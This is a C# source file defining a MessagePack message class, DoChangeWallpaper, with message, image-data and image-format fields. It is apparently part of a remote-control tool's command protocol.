using System;
using MessagePack;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;

namespace Pulsar.Common.Messages.FunStuff
{
    [MessagePackObject]
    public class DoChangeWallpaper : IMessage
    {
        [Key(1)]
        public string Message { get; set; }

        [Key(2)]
        public byte[] ImageData { get; set; }

        [Key(3)]
        public string ImageFormat { get; set; }
    }
}


